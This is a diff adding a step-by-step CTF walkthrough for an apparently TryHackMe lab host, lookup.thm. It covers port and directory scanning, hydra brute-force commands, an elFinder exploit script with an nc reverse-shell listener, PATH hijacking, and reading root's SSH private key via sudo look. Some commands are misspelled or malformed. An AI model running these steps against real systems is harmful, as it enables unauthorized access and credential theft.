@@ -1,0 +1,84 @@
+1- Adding the ip to the hosts
+  commands: * sudo su
+	    * nano /etc/hosts
+ add 
+   ip    lookup.thm
+
+2- Scan the ports
+ command: namp -Pn ip
+
+3- Looking for the hidden files by gobuster or dirsearch
+ command: dirsearch -u http://lookup.thm
+ or
+ command:gobuster dir -u http://ip/ -w /usr/share/wordlists/dirb/common.txt
+
+4- Try to login in the login page (index.php) --> The user "admin" is found but with wrong password
+
+5- Make a Brute force attack by hydra to get the password of admin
+  command: hydra -L admin -p rockyou.txt lookup.thm \
+		http-post-form "/index.php:username=admin&password=^PASS^:"Wrong password. Please try again."
+  or 
+    By using Burb suite Intruder or ZAP
+
+But this need permision to explore his password so no result found
+
+6- Try to enter as a ordinary user
+  command: hydrd -L <usersnameList.txt> -p <any_password>
+   http-post-form "login.php:username=^USER^&password=<any_password->as:admin >:"The Massage that appeare in the website if you don't have username or password"
+   *The massage in the end of the command is the condition,if not that this command shold give me Invalid username
+
+7- Try to get the password of any user of the found
+ command: hydra -l <username> -P <password.txt>
+  http-post-form "login.php:usernmae=<username>&password=^PASS^:"The Massage found on the website(condition)" 
+
+8- Login by the user cardinential
+ the page don't found because its name is changed so we change the name of the web in our hosts file to the name of the url in the website
+
+9- After we enterd to the page we try to upload reveseshell file but the website can know the php commands and refuse to upload eny file.php or commands
+
+10- Try to use something else we search on (elFinder and how to exploit it)
+  download python file and use it commands
+ run the file and see options:
+   command:
+	*python3 exploit.py -h                                                                                  
+	    options:
+ 		-h, --help            show this help message and exit
+  		-t <Target base URL>  Example: -t http://elfinder.url/elfinder/
+ 		-lh <Listener IP>     Example: -lh 127.0.0.1
+  		-lp <Listener Port>   Example: -lp 1337
+                                                                                                                    
+ run the listener command:
+	 *python3 exploit.py -t 'http://files.lookup.thm/elFinder' -lh 192.168.128.184 -lp 1337 
+   #Don't forget to run the lestenner in another terminal--> command: nc -lvnp <port>
+
+11- After the lestenner run we can enter the user machine and we can looking for the user.txt file as
+ command: find / -name "user.txt" 2>/dev/null
+
+
+
+jose : password123
+
+
+
+to add think to the path
+echo "echo 'uid=33(think) gid=33(think) groups=33(think)'" > /tmp/id
+
+
+think : josemario.AKA(think)
+
+To arrive to the rsa key in the hacking machine I can use this commands
+  *LFILE=/root/.ssh/id_rsa
+  *sudo /usr/bin/look '' "$LFILE"
+I got these commands form gtfobins.com website
+
+After that I can do a new file and but this key in it
+
+Give permisions to this file : chmod 600 id_ars 
+
+Enter the root machine by this command: ssh -i id_rsa root@lookup.thm
+
+Finall find the flag by: cat /root/root.txt
+
+
+
+
